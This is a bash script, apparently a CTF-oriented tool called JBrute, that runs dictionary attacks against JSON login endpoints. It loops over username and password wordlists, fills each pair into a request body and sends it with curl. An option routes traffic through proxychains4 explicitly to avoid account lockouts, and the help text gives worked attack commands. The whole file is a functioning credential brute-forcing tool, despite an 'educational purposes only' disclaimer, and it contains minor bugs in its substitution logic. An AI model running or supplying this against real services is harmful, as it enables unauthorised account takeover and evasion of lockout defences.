#!/bin/bash

Help() {
  echo "J B R U T E"
  echo "usage: jbrute.sh [-h] -t IP/URL -body REQUESTBODY [-uL USERNAMELIST.txt] [-pL PASSWDLIST.txt] [-x BOOLEAN]"
  echo "### ABOUT ###"
  echo "When you use an online login page, a request gets sent with your username and password get passed to the server before it is hashed and stored/checked for authentication. This tool sends those requests automatically with the ability to use dictionary attacks and proxychains4 to avoid lockouts. The J in JBrute stands for JSON. For the '-b' option, you can use any request body that is needed for your target so long as it is expecting a JSON type request. If you do not know what the body request looks like, you can use the Network tab of the Developer Console in your Browser to analyze the POST requests (right click and select 'Edit and Resend'). FOR EDUCATIONAL PURPOSES ONLY. DONT BE EVIL. ONLY USE ON SYSTEMS YOU HAVE PERMISSION FROM"
  echo "### OPTIONS ###"
  echo " -h		show this help message and exit"
  echo " -t		target to attack (*required)"
  echo " -b 		Request body to send (*required)"
  echo " -u		static userName to use"
  echo " -U		userName List to use"
  echo " -p		static password to use"
  echo " -P		password List to use"
  echo " -x		use Proxychains4 to avoid lockouts."
  echo "General Instructions" 
  echo " step 1 - pick/make a word list(s)"
  echo " step 2 - get POST info from network console browser info from target"
  echo " step 3 - run bash and output to a file"
  echo " step 4 - cat file and find flag"
  echo " step 5 - repeat if no flag"
  echo
  echo "### EXAMPLES ###"
  echo "Static Username and Static Password with no Proxychain"
  echo "./jbrute.sh -t http://123.456.7.8/Some_Login -b '{"method":"global.login","params":{"userName":"@@U@@","password":"@@P@@","clientType":"Web3.0"},"id":3}' -u admin -p default" 
  echo
  echo "Static Username and Password List with Proxychain"
  echo "./jbrute.sh -t http://123.456.7.8/Some_Login -b '{"method":"global.login","params":{"userName":"@@U@@","password":"@@P@@","clientType":"Web3.0"},"id":3}' -u admin -P ./wordList.txt -x true"
  echo
  echo "Username List and Static Password with no Proxychain"
  echo "./jbrute.sh -t http://123.456.7.8/Some_Login -b '{"method":"global.login","params":{"userName":"@@U@@","password":"@@P@@","clientType":"Web3.0"},"id":3}' -U ./wordlist.txt -P default"
  echo
  echo "Username List and Password List with Proxychain"
  echo "./jbrute.sh -t http://123.456.7.8/Some_Login -b '{"method":"global.login","params":{"userName":"@@U@@","password":"@@P@@","clientType":"Web3.0"},"id":3}' -U ./wordlist.txt -P ./wordlist.txt -x true"
}

while getopts t:b:u:U:p:P:x:h option
do
    case "${option}" in
        t) TARGET=${OPTARG};;
        b) BODY=${OPTARG};;
        u) STATUSER=${OPTARG};;
        U) USERFILE=${OPTARG};;
        p) STATPASS=${OPTARG};;
        P) PASSFILE=${OPTARG};;
        x) PROXY=${OPTARG};;
        h) Help
    esac
done

CheckTarget(){
  # make case for defining target
  #  if [ -z "$TARGET" ]; then
  #  echo "Invalid command - please provide a target with either '-t http://123.456.7.8'"
  #  echo
  #fi
  
  # make case for static username
  if [ -n "$TARGET" ]; then
    echo "using target: $TARGET"
    echo
    CheckUser
  fi
}

CheckUser(){
  # make case for username list
  if [ -z "$STATUSER" ] && [ -z "$USERFILE" ]; then
    echo "Invalid command - please provide a username with either '-u admin' or '-uL ./wordlist.txt'"
    echo
  fi
  
  # make case for static username
  if [ -n "$STATUSER" ]; then
    echo "using userName: $STATUSER"
    echo
    CheckPass
  fi
  
  # make case for wordlist usernames
  if [ -n "$USERFILE" ]; then
    echo "using wordlist: $USERFILE for username"
    echo
    CheckPass
  fi
}

CheckPass(){
  # make case for password list
  if [ -z "$STATPASS" ] && [ -z "$PASSFILE" ]; then
    echo "Invalid command - please provide a password with either '-p admin' or '-pL ./wordlist.txt'"
    echo
  fi
  
  # make case for static username
  if [ -n "$STATPASS" ]; then
    echo "using password: $STATPASS"
    echo
    CallProxy
  fi
  
  # make case for wordlist passwords
  if [ -n "$PASSFILE" ]; then
    echo "using wordlist: $PASSFILE for passwords"
    echo
    CallProxy
  fi
}

# The function refers to passed arguments by their position (not by name), that is $1, $2, and so forth. $0 is the name of the script itself
# $1 = STATUSER, $2 = pline, $3 = BODY
CallCurl(){    
    curl -X POST $TARGET \
   -H 'Content-Type: application/json' \
   -d "$3"
   echo "[---------   '$3'  ---------]"
}
CallCurlx(){    
   proxychains4 curl -X POST $TARGET \
   -H 'Content-Type: application/json' \
   -d "$3"
   echo "[---------   '$3'  ---------]"
}

CallProxy(){
  #
  if [ -n "$PROXY" ]; then
    echo "checking proxy - you should expect a [proxychain] response on next line..."
    echo 
    #case SUPF with proxy
    if [ -n "$STATUSER" ] && [ -n "$PASSFILE" ]; then
      echo "initializing password list..."
      while IFS= read -r pline
      do 
        echo "################################"
        echo $(CallCurlx "$STATUSER" "$pline" "$(echo "$BODY" | sed 's/@@P@@/'"$pline"'/'  | sed 's/@@P@@/'"$pline"'/' )" )
      done < "$PASSFILE"
    fi
    
    #case UFSP with proxy
    if [ -n "$USERFILE" ] && [ -n "$STATPASS" ]; then
      echo "initializing password list..."
      while IFS= read -r uline
      do 
        echo "################################"
        echo $(CallCurlx "$uline" "$STATPASS" "$(echo "$BODY" | sed 's/@@U@@/'"$uline"'/' | sed 's/@@P@@/'"$STATPASS"'/' )" )
      done < "$USERFILE" 
    fi
    
    #case UFPF with proxy
    if [ -n "$USERFILE" ] && [ -n "$PASSFILE" ]; then
      echo "initializing password list..."
      while IFS= read -r uline
      do 
        while IFS= read -r pline
        do
          echo "################################"
          echo $(CallCurlx "$uline" "$pline" "$(echo "$BODY" | sed 's/@@U@@/'"$uline"'/' | sed 's/@@P@@/'"$pline"'/' )" )
        done < "$PASSFILE"
      done < "$USERFILE" 
    fi
    
    #case SUSP without proxy
    if [ -n "$STATUSER" ] && [ -n "$STATPASS" ]; then
      echo "################################"
      echo $(CallCurlx "$STATUSER" "$STATPASS" "$(echo "$BODY" | sed 's/@@U@@/'"$STATUSER"'/' | sed 's/@@P@@/'"$STATPASS"'/' )" )
    fi
  fi
  ##
  if [ -z "$PROXY" ]; then
    echo "no proxy for you! Beware of lockouts..."
    echo
    #case SUPF without proxy
    if [ -n "$STATUSER" ] && [ -n "$PASSFILE" ]; then
      echo "initializing password list..."
      while IFS= read -r pline
      do 
        echo "################################"
        echo $(CallCurl "$STATUSER" "$pline" "$(echo "$BODY" | sed 's/@@P@@/'"$pline"'/'  | sed 's/@@U@@/'"$STATUSER"'/' )" )
      done < "$PASSFILE"
    fi
    
    #case UFSP without proxy
    if [ -n "$USERFILE" ] && [ -n "$STATPASS" ]; then
      echo "initializing password list..."
      while IFS= read -r uline
      do 
        echo "################################"
        echo $(CallCurl "$uline" "$STATPASS" "$(echo "$BODY" | sed 's/@@U@@/'"$uline"'/' | sed 's/@@P@@/'"$STATPASS"'/' )" )
      done < "$USERFILE" 
    fi
    
    #case UFPF without proxy
    if [ -n "$USERFILE" ] && [ -n "$PASSFILE" ]; then
      echo "initializing password list..."
      while IFS= read -r uline
      do 
        while IFS= read -r pline
        do
          echo "################################"
          echo $(CallCurl "$uline" "$pline" "$(echo "$BODY" | sed 's/@@U@@/'"$uline"'/' | sed 's/@@P@@/'"$pline"'/' )" )
        done < "$PASSFILE"
      done < "$USERFILE" 
    fi
    
    #case SUSP without proxy
    if [ -n "$STATUSER" ] && [ -n "$STATPASS" ]; then
      echo "################################"
      echo $(CallCurl "$STATUSER" "$STATPASS" "$(echo "$BODY" | sed 's/@@U@@/'"$STATUSER"'/' | sed 's/@@P@@/'"$STATPASS"'/' )" )
    fi
  fi
  #
}

echo

CheckTarget
